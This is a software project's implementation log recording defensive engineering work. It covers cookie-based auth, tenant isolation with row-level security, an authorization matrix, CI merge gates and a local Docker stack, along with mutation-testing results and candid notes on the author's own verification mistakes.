The repository's **first TypeScript**: a minimal `apps/web` Next.js 16.2 package containing auth and nothing else — no design system, no layout, no pages. `STEP-003` builds the shell on top.

| Module | Responsibility |
| --- | --- |
| `auth/cookies.ts` | `__Host-` prefixed, httpOnly, Secure cookie policy |
| `auth/csrf.ts` | Double-submit token, deny-by-default on every non-safe method |
| `auth/guest.ts` | 7-day opaque bearer capability, hashed at rest, expiry enforced server-side |
| `auth/refresh.ts` | Single-flight refresh, per session key |
| `auth/oidc.ts` | The **only** file that knows about Auth0 |
| `auth/session.ts` | Composes the above; the file the sub-step names |

41 TypeScript tests. `pnpm test` now runs both suites.

### Why this approach
**The guarantee is the absence of a capability.** There is no function anywhere in this package that writes a token to `localStorage` or a JS-readable cookie. `tokenCookie()` throws if the name lacks the `__Host-` prefix and forces `httpOnly`. A developer in a hurry has nothing convenient to reach for, which is stronger than a rule asking them not to.

**Single-flight refresh is required by Auth0's rotation, not a performance tweak.** Rotation invalidates the previous refresh token the moment one is redeemed. Two concurrent refreshes therefore present a just-revoked token, Auth0 reads that as replay, and it can revoke the whole family — signing the user out. Without coalescing, concurrency logs users out.

**SameSite=Lax, not Strict.** A Strict session cookie is withheld on the top-level navigation back from the identity provider, so the user lands signed out immediately after signing in. Lax still blocks cross-site subrequests, and CSRF is covered independently by the double-submit token rather than resting on SameSite alone.

**Guest expiry is checked against the stored record, not the cookie.** A cookie `Max-Age` is a client-side hint an attacker replaying a captured token simply ignores.

### What is NOT delivered
**`REQ-SEC-003` is partial.** Two acceptance criteria are unmet:
- **Nothing has run against a live Auth0 tenant.** There is no account and no credentials in this repository. The flows are exercised against a spec-compliant OIDC shape; passkey enrolment, tenant rate limits and rotation under genuine concurrency are **unproven**.
- **"Auth flows keyboard and screen-reader complete" cannot be met** — there is no UI to test. Binds at STEP-003.

Guest session **storage** does not exist either: `validateGuestSession` takes the record as an argument and denies when it is `undefined`, so the logic is complete and fails closed, but nothing persists it yet.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** |
| Python tests | 292 passed |
| TypeScript tests | **41 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |

**Mutation testing — 7/7 killed:** token cookies made JS-readable, single-flight removed, IdP outage failing open, guest expiry ignored, CSRF allowing a missing header, PKCE downgraded to `plain`, and the OIDC `state` check skipped when the expected value is absent.

### Two guards stopped being vacuous
Since STEP-001, `typecheck.sh` and `module-boundaries.sh` had reported `PASS (vacuous): 0 TypeScript files`. This sub-step ended that, and `typecheck` immediately earned its keep by catching a real defect: `apps/web/package.json` had no `"type": "module"`, so TypeScript treated every file as CommonJS under `verbatimModuleSyntax`.

It then failed for a **wrong** reason — it ran `tsc -p tsconfig.base.json`, typechecking `apps/web` with the root's module settings instead of the package's own, producing errors that described a configuration mismatch rather than a defect. Rewritten to typecheck each package with its own config via `pnpm -r typecheck`, and — so that this does not become a new way to skip checking — it now **fails if a package contains TypeScript but declares no typecheck script**.

### Surprises
**`vi.fn<[Args], Return>()` is the vitest 2 signature**; v3 takes a function type. Caught by the typecheck guard on its first real run, which is a fair advertisement for it.

**pnpm 11 blocks install scripts by default.** `esbuild` and `sharp` needed explicit allowlisting. Rather than a blanket approval, `pnpm-workspace.yaml` now carries an `onlyBuiltDependencies` list where each entry has a stated reason — an install script is arbitrary code execution at dependency-install time.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Verify against a real Auth0 tenant; enrol a passkey | Before STEP-004 ships auth |
| Accessible sign-in UI (WCAG 2.2 AA) | STEP-003 |
| Guest session storage table | STEP-002.07 |
| Immediate revocation of an already-issued access token | STEP-002.07 |
| Route handlers and middleware that actually set these cookies | STEP-004 |

---

## IMPL-011 — STEP-002.04 — User, organization, invitation and service-account provisioning

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (satisfied), REQ-TRIP-005 (**partially** — see below) |
| Blast radius | [BR-013](blast-radius/BR-013-identity-provisioning.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `19a6037` at pre-change; HEAD moved to `972b93f` mid-sub-step (BUG-012 fix) |

### What was built
`services/identity/src/provisioning.py` — the first module under `services/`, establishing the layering between domain services and the `apps/api` boundary.

| Function | Guarantee |
| --- | --- |
| `provision_user` | Idempotent by IdP subject, arbitrated by the database |
| `create_guest_user` | Anonymous user with no `idp_subject` |
| `create_organization` | Organization + owner membership in one call |
| `grant_membership` / `revoke_membership` | Grant, reinstate, revoke — evidence retained |
| `active_role_keys` | The single place "is this membership live?" is decided |
| `register_service_identity` / `revoke_service_identity` | Workload identity, no credential parameter |
| `migrate_guest_to_account` | Replay-safe, with before/after counts |

16 integration tests against the real database (292 total).

### Why this approach
**Idempotency belongs to the database, not the application.** `provision_user` uses `INSERT … ON CONFLICT (idp_subject) DO UPDATE … RETURNING id, (xmax = 0)`. Check-then-insert loses the race between two concurrent first logins; `ON CONFLICT` lets the database arbitrate so the loser receives the winner's row instead of a second identity. A test runs two real concurrent connections and asserts one row and one id.

**`xmax = 0`** distinguishes an inserted row from an updated one, so the caller can tell first login from every later login without a second query.

**Revocation stamps `revoked_at`; it never deletes.** Deleting erases the evidence that access was once held, which is what an investigation needs. A test asserts the row survives revocation.

**No parameter can carry a secret.** REQ-SEC-003 forbids static long-lived keys. `register_service_identity` has nowhere to put one — a stronger guarantee than a policy asking people not to. Asserted by introspecting the function signature, so adding such a parameter breaks a test.

**Nothing here knows the identity provider.** `DEC-004` is open and §5 requires provider code to stay behind an interface. This module's only knowledge of the IdP is the opaque `idp_subject` string that `auth.claims.TokenVerifier` already produces.

### What this sub-step does NOT deliver
**`REQ-TRIP-005` is not satisfied.** It requires guest→account migration to yield exactly one copy of each trip. **There is no `trips` table** — trips arrive at STEP-007. What migrates today is memberships. The idempotency contract, the replay tests and the before/after reporting are built now so STEP-007 extends the same transaction rather than inventing the guarantee later, but the requirement must not be marked complete on this basis.

**Migration has no feature flag or dry-run**, which §11 requires. No flag system exists until STEP-024. `MigrationReport` provides the counts a dry-run would need; the flag does not exist. Stated, not glossed.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 18 Python files typechecked |
| Test suite | **292 passed** (was 276) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 7/7 killed:** removing `ON CONFLICT` (2 tests), migration losing `DO NOTHING`, migration not revoking source rows, revoke switching to `DELETE`, `active_role_keys` ignoring `expires_at`, ignoring `revoked_at`, and `create_organization` skipping the owner membership.

### Surprises and what they cost
**I claimed a schema gap that did not exist.** I reported that `users.idp_subject` had no unique constraint and demonstrated a "race" producing duplicate users. Both were wrong: `users_idp_subject_key` exists, and my `\d users` output had been truncated by `head -14`, cutting off the index list. The race demonstration then *disproved* my own claim — the second insert was rejected — which is how it was caught. Cost: one wrong conclusion stated confidently before it was checked.

**The schema was stricter than I assumed, again.** Migration 001 carries `users_identifiable_unless_guest` — a non-guest must have an `idp_subject` or an email. My hand-rolled test fixtures violated it. Fixed by building fixtures through `provision_user` instead of raw INSERTs, so a fixture cannot drift from the schema's own rules.

**`create_organization` cannot use a server-generated id.** The RLS policy is `WITH CHECK (id = app_current_org())`, so an organization may only be inserted when the transaction's tenant context already equals its id — the id must therefore exist before the INSERT. A server-generated default could not satisfy its own policy. Surprising enough to warrant a comment in the code.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Trip re-parenting — the actual REQ-TRIP-005 | STEP-007 |
| Feature flag + dry-run for migration | STEP-024 |
| Persist `AuditRecord` | STEP-002.07 |
| Revocation ending live sessions | STEP-002.05 |

---

## IMPL-010 — STEP-002.03 — Role and attribute policy definitions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-004 (also REQ-ADMIN-002, REQ-COLL-003, REQ-LIVE-005) |
| Blast radius | [BR-012](blast-radius/BR-012-authorization-policy.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d9be78b` — matched HEAD at pre-change |

### What was built
One authorization decision point covering all 22 operations.

| Module | Responsibility |
| --- | --- |
| `authz/roles.py` | 9 roles, 22 operations, `Rule` shape |
| `authz/matrix.py` | **Generated** 176-cell decision table |
| `authz/policy.py` | `authorize()` / `enforce()` — the only place a permission is decided |
| `tools/authz_matrix_source.py` | Markdown parser, shared by the generator and the drift gate |
| `tools/gen_authz_matrix.py` | Regenerates `matrix.py` from the matrix document |

247 new tests (276 total), including all 176 cells exercised individually.

### Why this approach
**The matrix generates the code, not just the tests.** The sub-step asked for matrix-driven tests. Generating the *table itself* goes one step further and removes the failure mode entirely: there is no hand-transcribed copy of 176 cells to get wrong. `AUTHORIZATION_MATRIX.md` §3 is now executable, and a drift test fails CI in both directions — edit the markdown without regenerating, or hand-edit the generated file, and the build breaks.

**Tenant is checked before role, deliberately.** A `trip_owner` in tenant A asking about tenant B's trip would otherwise pass the role check and fail later on relationship, and the audit record would read "relationship failure" instead of the truth. `ALRT-SEC-001` needs `cross_tenant_attempt` to be unambiguous, so the ordering is a security property and a test asserts the reason string.

**Conditional cells are not permissions.** A `⚠️` cell returns `allow=True` *with a condition*, and the evaluator denies unless the condition is proven. An unrecognised condition name also denies, so a typo in the matrix fails closed rather than granting access.

**`service` has no matrix column, so it is denied all 22 operations.** That is the matrix's own content, not an omission, and §4 requires exactly it ("no service holds a blanket admin role"). A test fails if a `service` column ever appears without review.

### Decisions this forced
| Decision | Resolution |
| --- | --- |
| `ADR-012` — the sub-step named `packages/authz/src/policy.ts`, TypeScript | Implemented in **Python**, co-located with enforcement. `REQ-SEC-004` demands server-side enforcement; the server is Python; a TS module would need an RPC hop inside the authorization path. The sub-step's own §8 says client-side checks are presentation only |
| `DEC-010` — `ops_admin` approving a high-impact override | **Unresolved, and left that way.** The matrix marks the cell conditional but never names the condition; §4's four-eyes rule names a *second curator*. Encoded as a condition nothing grants, so it **fails closed**, with a test pinning that behaviour |

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 16 Python files typechecked |
| Test suite | **276 passed** (was 29) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 6/6 killed:**

| Mutant | Caught by |
| --- | --- |
| Edit the matrix markdown, skip regeneration | drift gate |
| Hand-edit the generated `matrix.py` | drift gate + anchor cell + owner-only test |
| Deny-by-default becomes allow-by-default | 2 tests |
| Four-eyes same-actor check removed | 1 test |
| Unspecified condition silently allows | 3 tests |
| Guest expiry check removed | 1 test |

### Surprises and what they cost
**A mutant appeared to survive, and it was my measuring instrument that was broken.** Hand-editing the generated matrix reported "276 passed". The mutation had not applied: `ruff format` reflows the generated file so `Rule(` sits on its own line, and my `str.replace` pattern no longer matched. I nearly recorded a false gap as a finding. Re-run with a regex spanning the reflowed entry, three tests failed as they should.

This is the fourth instance of the same shape in this project — BUG-001's self-truncating guard, dependency-cruiser cruising zero modules, BUG-011's stub `test` script, and now a mutation harness that mutated nothing. **A negative result needs its own verification.** The fix here was cheap only because the mutation printed whether the substitution count was non-zero when I checked; that check should have been there from the start.

**The generator found a documentation gap by refusing to guess.** It raises on a conditional cell whose condition is not stated anywhere, which is how `DEC-010` surfaced. Nine `advisor` cells resolved from §4's delegation rule and one `privacy_operator` cell from §4's support-scoping rule; the eleventh had no rule to resolve against.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Make calling `authorize` structural, not conventional | STEP-004 |
| Audit sink for `audit=True` decisions | STEP-002.07 |
| Verify caller-asserted conditions (delegation, unlock, prior approver) | STEP-002.04 / STEP-021 |
| Answer `DEC-010` | Before STEP-021 |
| `ALRT-SEC-001` on `cross_tenant_attempt` | STEP-024 |

---

## IMPL-009 — STEP-002.02 — Tenant and actor context resolution at the API boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-SEC-004 |
| Blast radius | [BR-011](blast-radius/BR-011-tenant-context-at-the-api-boundary.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
The repository's first application code: `apps/api/src/auth/`, six modules.

| Module | Responsibility |
| --- | --- |
| `claims.py` | `TokenClaims` (frozen) and the `TokenVerifier` **port** — `DEC-004` stays unbound |
| `context.py` | `RequestContext`, and explicit propagation across async/process boundaries |
| `dependencies.py` | The FastAPI dependency; reads only the `Authorization` header |
| `db.py` | Binds tenant to the transaction via `set_config(…, true)` |
| `errors.py` | One opaque denial shared by "forbidden" and "not found" |
| `events.py` | Stamps `tenant_id`/`actor_id` onto an event envelope |

29 tests in `tests/api/`, covering token-only resolution, ignored client hints, byte-identical denial, fail-closed job payloads, absence of ambient context, and — with the local stack up — real RLS enforcement through `bind_tenant`.

### Why this approach
**No ambient context.** There is deliberately no `get_current_context()`, no `ContextVar`, no thread-local. The sub-step named ambient state crossing an async boundary as the classic leak, so context is a value that must be passed, and the type checker enforces it at every call site. The ergonomic cost is real and accepted: ambient state is convenient precisely because it crosses boundaries you did not think about, which is the same property that makes it leak between tenants. A test asserts the ambient accessor has not been reintroduced.

**A verifier port, not a vendor.** `DEC-004` is open and binds at `STEP-002.04`. Hard-coding an OIDC library here would have decided it silently.

**`set_config` rather than `SET LOCAL`.** `SET LOCAL app.current_org = $1` is a syntax error — SET takes no bind parameters — so the obvious implementation formats a UUID into SQL on the tenancy boundary. `set_config('app.current_org', %s, true)` keeps it a bind parameter at the same transaction scope. Verified directly against PostgreSQL 18.4. Cost: one round trip per transaction.

**404 for both denial and absence.** A distinguishable 403 is an existence oracle across tenants. `opaque_denial()` takes no `reason` argument, because an optional detail parameter is exactly how indistinguishability erodes.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — and now actually runs the tests (`BUG-011`) |
| `tests/api/` | **29 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean on 8 files |

**Mutation testing — five security properties, each broken on purpose:**

| Mutant | Result |
| --- | --- |
| Trust `X-Tenant-Id` header | killed (2 tests) |
| Denial becomes 403 | killed (6 tests) |
| Denial body states a reason | killed (1 test) |
| `set_config(…, false)` — session-wide | **SURVIVED** → test added → now killed |
| Job payload defaults instead of raising | killed (2 tests) |

### Surprises and what they cost
**The surviving mutant was the most valuable result.** Making the binding session-wide instead of transaction-scoped — the pooled-connection leak — passed all 28 tests. R7 proves that property in raw SQL; nothing proved it for `bind_tenant`, which is the function application code actually calls. **A property proven at one layer is not proven at the layer above it.**

**A `422` that looked like a passing suite.** Switching to `Annotated[RequestContext, Depends(dependency)]` to satisfy ruff's B008 broke every route. With `from __future__ import annotations`, the annotation is a string that FastAPI resolves against **module** globals, but `dependency` is a local of the test's app factory; resolution fails and FastAPI silently reinterprets the parameter as a request field. This is a live hazard for `STEP-004` and is flagged in the test file.

**My own verification command hid it.** I checked with `pytest -q | grep -E '^\.|passed|failed' | tail -3`; the `^\.` matched the `.venv/…` warning path, so `tail -3` printed that instead of the result. The failure was visible and I filtered it out. Same family as the bugs this project keeps finding: the check was correct about the wrong thing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Enforce that jobs/activities carry context | STEP-006 |
| Outbox refuses an unstamped envelope | STEP-006 |
| Alerting on auth denials (`ALRT-SEC-001`) | STEP-024 |
| Confirm the graph indexes Python at all | post-commit re-index |

---

## IMPL-008 — STEP-002.01 — Postgres readiness race fix (BUG-009)

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-PLAT-001 |
| Blast radius | [BR-010](blast-radius/BR-010-postgres-readiness-race.md) (MEDIUM–HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
Two fixes, from re-verifying `STEP-002.01` against a **clean** database rather than trusting its recorded 12/12:

1. `docker-compose.dev.yml` — the Postgres healthcheck is now `pg_isready -h 127.0.0.1`. The entrypoint's first-boot temporary server listens on the Unix socket only, so a socket check went green against a server that was about to be shut down.
2. `tests/security/test_tenant_isolation.sh` — a connectivity probe now runs before the schema probe, so "cannot reach the database" is no longer reported as "tables missing".

### Why this approach
Adding a sleep or a retry loop would have hidden the race rather than removed it, and would have left every future service with the same faulty readiness signal. Checking the transport clients actually use makes the healthcheck structurally unable to pass early.

### Verification performed
| Check | Result |
| --- | --- |
| Three `down -v` → `up --wait` → R7 cold cycles | **12/12 each**; `--wait` now takes 6s |
| Race measured directly | socket=UP/tcp=down at 1250ms; socket=down/tcp=UP at 2000ms |

### Surprises
`STEP-002.01` was **not** wrong — but its 12/12 had only ever been observed against an already-running, already-seeded database. The result was true and was not evidence of what it appeared to prove. Steady-state verification cannot observe a startup race.

---

## IMPL-007 — STEP-002.01 — Identity schema and row-level security

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-SEC-001, REQ-SEC-002 |
| Blast radius | BR-008 (**HIGH**) |
| Graph indexed commit | `0cac408` — matched HEAD at pre-change |

### What was built
`db/migrations/001_identity_tenancy.sql` — organizations, users, roles, memberships, service identities, with RLS **enabled and forced**, a non-owner `journeylab_app` role carrying `NOBYPASSRLS`, and transaction-scoped tenant context via `SET LOCAL`. Plus `tests/security/test_tenant_isolation.sh`, which **establishes regression check R7**.

### Why this approach
Four decisions where the obvious option was weaker:

| Decision | Weaker alternative | Why |
| --- | --- | --- |
| `FORCE ROW LEVEL SECURITY` | `ENABLE` alone | Without FORCE the table owner bypasses every policy silently — the commonest way RLS is believed present but absent. Verified by test |
| `SET LOCAL` (transaction-scoped) | Session-level `SET` | A pooled connection would carry one tenant's context into another's transaction. Tested explicitly per `BR-008` §9 |
| Deny-by-default via NULL | Explicit deny policies | `app_current_org()` returns NULL when unset; every comparison is NULL, so **missing context denies access** rather than exposing everything |
| No column for a static service key | `secret` column | `REQ-SEC-003` — a credential that cannot be stored cannot be leaked |

Migration 001 sets the convention every later migration inherits, documented in its header.

### `DEC-004` is not blocking here
STEP-002 is blocked on the identity-provider decision, but **`.01` is not**: schema and RLS are provider-independent. `users.idp_subject` is a provider-neutral opaque string. `DEC-004` binds at `.04` (provisioning), confirmed by reading the sub-step files rather than assuming.

### What surprised us — a false pass in a security test
The suite's first run reported **3 passes for cross-tenant write denial while the tables did not exist**. Migration 001 had failed on missing `citext`, so every write errored — and `if <query>; then bad else ok` cannot tell a policy denial from a schema error.

That is the sixth instance in this repository of a check being correct about the wrong thing, and the most dangerous, because the subject was tenant isolation. Logged as `BUG-007` with three fixes: a precondition gate that ERRORs when the schema is absent, assertions on error *text* rather than exit code, and a self-contained migration.

The suite now carries its own meta-test: a weakened `USING (true)` policy must expose both tenants. It does — 2 rows — then the strict policy is restored and it returns 1. Without that, a suite passing against disabled RLS would look identical to one passing against working RLS.

### Follow-up created
| Item | Type |
| --- | --- |
| `ALRT-SEC-001` / `RB-SEC-001` not implemented — cross-tenant denials do not alert | Deferred to `STEP-024` (recorded in `BR-008` §5 category 11) |
| Migration runner (ordering, applied-tracking) | `STEP-006` |
| `DEC-004` identity provider | Open — binds at `.04` |

### Verification
| Check | Result |
| --- | --- |
| R7 isolation suite | **PASS — 12/12 assertions** |
| Suite meta-test (weakened policy exposes both tenants) | **PASS** |
| Migration idempotency (applied twice) | **PASS — 0 errors on re-run** |
| `pnpm verify` | PASS — 15 checks |

---

## IMPL-006 — STEP-001.06 — CI workflows and the change-impact merge gate

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-KG-003, REQ-KG-008 |
| Blast radius | BR-006 (MEDIUM) |
| Graph indexed commit | `e0062c2` — matched HEAD at pre-change |

### What was built
Three workflows (`verify`, `change-impact`, `knowledge-graph`), the enforcement gate `tests/guards/change-impact-record.sh`, and `tests/guards/workflow-refs.sh`.

### Why this approach
**The gate logic is a local script; the workflow is a thin caller.** A gate written only as workflow YAML cannot be verified until a PR exercises it — and an unverified gate is precisely the shape of `BUG-004`, where a guard was trusted before its scope was tested. Writing the logic locally made it meta-testable immediately.

This is the sub-step that converts `REQ-KG-008` from a rule people follow because they remember it into one the build enforces.

### Deliberate exemptions
Documentation, generated context files and lock-file-only refreshes are exempt. A gate that blocks legitimate work gets disabled, and a disabled gate is worse than none. The exemption branch is meta-tested, not assumed.

### What was verified — and what was not
| Claim | Evidence |
| --- | --- |
| Code without a record is blocked | Meta-test on a scratch branch: exit 1, cites `REQ-KG-008` |
| Docs-only changes pass | Meta-test: exemption branch taken, exit 0 |
| Incomplete record (no risk score) is blocked | Meta-test: exit 1, names the missing section |
| Workflow YAML parses; references resolve | `workflow-refs.sh`, meta-tested with a bogus script |
| **Workflows actually run on GitHub** | **NOT VERIFIED** — cannot execute Actions locally. The first PR is the real test |
| **10-minute refresh target met** | **NOT MEASURED** — no merge has run the workflow |

### Honest limitation in the graph workflow
The runner rebuilds the index rather than upserting a commit diff, because it starts with no `.gitnexus/` state. That satisfies the freshness *target* but not the incremental *design* in `INDEXING_AND_REFRESH` §5. True incremental refresh needs persisted index state and is deferred to `STEP-026`. Recorded in the workflow header, the design doc and here — not silently glossed.

### What surprised us
1. **Two meta-tests were invalid before they were right.** `git stash -u` and `git checkout` both removed the untracked guard script, so the harness reported exit 127 ("file not found") which I initially read as a gate verdict. Fixed by committing the guard first, then testing on a scratch branch. Same lesson as `BUG-004`: a test can fail for reasons that have nothing to do with what it claims to measure.
2. **`BUG-004`'s fix worked immediately.** The markup guard caught a stray tag in an untracked `BR-006` *before* commit — the identical defect that slipped through in `f80c8b3` one sub-step earlier.

### Verification
| Check | Result |
| --- | --- |
| Gate meta-tests (4 scenarios) | PASS |
| Workflow guard meta-test | PASS |
| `pnpm verify` (15 checks) | PASS |

---

## IMPL-005 — STEP-001.05 — README, architecture map and ADR files

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-004 |
| Blast radius | BR-005 (LOW) |
| Graph indexed commit | `23ec095` — matched HEAD at pre-change |

### What was built
`README.md` (orientation, prerequisites, setup, port table, repository map, data
classifications, working agreement, blockers); `docs/adr/` with **10 ADR files** plus
an index; ADR cross-links added to `DECISION_LOG`; and
`tests/guards/readme-accuracy.sh`.

### Why this approach
A README is the first thing a newcomer runs, so its failure mode is silent: it drifts,
and the reader concludes the documentation cannot be trusted. Rather than asserting it
is accurate, the guard **executes the claim** — every `pnpm` script it mentions must
exist, every link must resolve, every documented port must match
`docker-compose.dev.yml` in both directions, and the documented Node path must yield
v24.

ADRs were promoted from decision-log entries into files because a decision that lives
only inside a larger document cannot be reviewed, superseded or linked from a commit
message independently.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Keep `ADR-NNN-<slug>.md` numbering | Rename to `0001-architecture.md` as `STEP-001` §18 listed | The step file's name predates ADR numbering. `ADR-001` is "documentation is the source of truth"; the architecture decision is `ADR-003`. Renumbering would break cross-references across ~100 documents and invalidate commit messages citing ADRs. **Step file corrected instead** |
| Guard checks ports **bidirectionally** | Only check README→compose | A port published but undocumented is as bad as one documented but unpublished |
| Guard does not run `pnpm verify` | Run full setup end to end | It is itself part of `pnpm verify` — that would recurse |

### The acceptance criterion I did not claim
The sub-step required *"an engineer who did not write the README completes setup using
it alone."* **I wrote it, so I cannot certify that.** The guard proves the commands are
correct and current; it cannot prove they are comprehensible to a newcomer.

Recorded as **partially satisfied**, with the human half outstanding. Marking it done
would have been the fourth false pass in this repository — the pattern each time is a
check that verifies something adjacent to, but not the same as, the actual claim.

### What surprised us
The `substep-docs` guard added in the previous sub-step **immediately blocked this
one**: I set `STEP-001.05` to `VERIFIED` before writing this entry, and `pnpm verify`
failed with *"1 missing record across 5 VERIFIED sub-steps"*. The guard written to
prevent `BUG-003` caught the same mistake one sub-step later. That is the clearest
evidence so far that these guards earn their cost.

### Follow-up created
| Item | Type |
| --- | --- |
| Newcomer walkthrough of the README | **Open** — needs a second person |
| ADR files for future decisions | Use `ADR_TEMPLATE`, index in `DECISION_LOG` |

### Verification
| Check | Result |
| --- | --- |
| README guard — scripts, links, ports, Node path | PASS |
| Guard meta-tests (bogus script, broken link, port mismatch) | PASS — all three caught, exit 1 each |
| 10 ADR files created and indexed | PASS |
| `pnpm verify` (14 checks) | PASS |

---

## IMPL-004 — STEP-001.04 — Local dependency stack

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-004 (LOW) |
| Graph indexed commit | `28923aa` — matched HEAD at pre-change |
| Commit | `8a9af9b` |

### What was built
`docker-compose.dev.yml` bringing up PostgreSQL 18.4 (PostGIS 3.6.4 + pgvector 0.8.6 + pg_trgm 1.6), Redis 8, MinIO, NATS JetStream and Jaeger v2 — all on the reserved port block **5700-5709**, bound to `127.0.0.1` only. Plus `infra/local/postgres/Dockerfile`, init SQL, `.env.example`, a port-collision guard, and `pnpm dev` / `dev:down` / `dev:reset` / `dev:logs`.

### Why this approach
**Port isolation was an explicit repository-owner constraint** — multiple projects share this Docker host. Rather than picking ports ad hoc, JourneyLab reserves a contiguous documented block and a guard enforces it.

The important subtlety: **a stopped project still owns its ports.** Port 5544 read as free to `lsof` purely because Saakshya was stopped. The guard therefore parses other projects' compose *files*, not just live sockets. Checking only what is running would have produced a collision the first time that project restarted.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Multi-stage PostGIS + copied pgvector | Downgrade to PG17; drop pgvector locally; build from source | **Preserves the full baseline.** PG17 has no arm64 PostGIS either; dropping an extension would make local diverge from production; no compiler exists in the base image |
| amd64 emulation for PostgreSQL | Native PG17 | Measured ~3s to ready — cheaper than breaching the PG18 baseline |
| NATS as local queue | Kafka, Redpanda | `DEC-009` is open; the AsyncAPI contract is transport-independent, so this is deliberately substitutable |
| Bind all ports to `127.0.0.1` | Default `0.0.0.0` | Nothing on a dev machine should be network-reachable by default |
| Pinned MinIO `RELEASE.*` tag | `latest` | `REQ-PLAT-002` forbids floating tags |

### What surprised us — five wrong assumptions, all caught by execution
1. **`postgis/postgis:18-3.6` is amd64-only.** `docker manifest inspect` said EXISTS, so it looked fine until the build failed with "no match for platform". Existence and runnability are different questions on Apple Silicon.
2. **PGDG has no PostGIS or pgvector package for PG18** on either image's repo — the postgis image carries only 4 packages and no compiler, ruling out both apt and source builds.
3. **PostgreSQL 18 changed its volume mount point.** Mounting `/var/lib/postgresql/data` makes the container refuse to start; PG18 wants `/var/lib/postgresql` so `pg_upgrade --link` does not cross a mount boundary.
4. **`jaegertracing/all-in-one:1.62` does not exist.** I invented a plausible tag; the correct image is `jaegertracing/jaeger:2.0.0`.
5. **I twice wrote a wrong comment about the Jaeger image** — first "distroless, no shell" (it has a shell), then "no wget or nc" (it has both). Corrected to a working healthcheck rather than documenting a limitation that was not real. Writing a confident explanation for a failure is easy; verifying it is the work.

### Process slip — recorded rather than hidden
The heredoc that should have written this entry, the regression entry and the sub-step status **failed with a Python syntax error, and the commit proceeded anyway**. `8a9af9b` therefore shipped without its required documentation, violating [SUB_STEP_PROTOCOL](../02-delivery/SUB_STEP_PROTOCOL.md) §8.

Cause: the commit ran in the same shell invocation as the log-writing script, so a failure in the first half did not stop the second. **Correction:** documentation writes must succeed before `git commit` runs, not alongside it. Logged as `BUG-003`.

### Verification
| Check | Result |
| --- | --- |
| 5/5 services healthy | PASS |
| Extensions functional (157 km geodesic; L2 √27) | PASS |
| Host connectivity on 5700-5707 | PASS |
| No collision with trekyatra / saakshya / real-estate | PASS |
| Port guard meta-test | PASS |
| `pnpm verify` (12 checks) | PASS |

---

## IMPL-003 — STEP-001.03 — Ownership, governance and the TypeScript 7 upgrade

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-003 |
| Decisions | `ADR-009` (TypeScript 7.0.2), `ADR-010` (ownership) |
| Blast radius | BR-003 (LOW after mitigation) |
| Graph indexed commit | `ef7af7a` — matched HEAD at pre-change |
| Commit | `1a44d71` |

> **Written retrospectively during the STEP-001 closure audit.** The audit found this
> entry missing: `STEP-001.03` was committed with `BR-003` and a regression entry, but
> no implementation-log entry. Recorded as `BUG-005` — including why the
> `substep-docs` guard failed to catch it.

### What was built
`CODEOWNERS` (catch-all + 9 rules), `SECURITY.md`, `CONTRIBUTING.md`; ownership propagated across 56 documents and every step's front-matter; TypeScript upgraded 6.0.3 → 7.0.2; `dependency-cruiser` removed and the boundary check rewritten TypeScript-independently.

### Why this approach
Two owner decisions arrived together. `ADR-010` closed `BLK-001`, the highest-exposure realised risk in the register — until then no step could leave `READY` and no gate could be signed off.

`ADR-009` was the `ASM-004` revalidation case: the blueprint baseline said TypeScript 6.0, but 7.0.2 was `latest`, and portfolio standard §4.18 requires current stable at implementation time. I pinned 6.0.3 first and surfaced 7 for explicit owner choice rather than adopting it silently.

### What surprised us
**TypeScript 7 silently broke module-boundary enforcement.** `dependency-cruiser` 18.1.1 supports `typescript <7`; under the new pin it cruised **0 modules and reported "no dependency violations found"** — a green check verifying nothing. `ADR-003`'s splittability guarantee would have become unenforced without anyone noticing.

Caught only because the boundary guard's meta-test asserts the **rule name**, not merely a non-zero exit. The fix was to rewrite the check TypeScript-independently: import paths are textual, so no compiler upgrade can disable the rule again.

**My pre-change analysis missed this.** I checked the *source* dependency surface (0 files) and called the risk minimal, without checking which *tools* consume TypeScript. Lesson recorded in `BR-003`: for version upgrades, enumerate consuming tools, not just importing source.

### Consequence recorded, not hidden
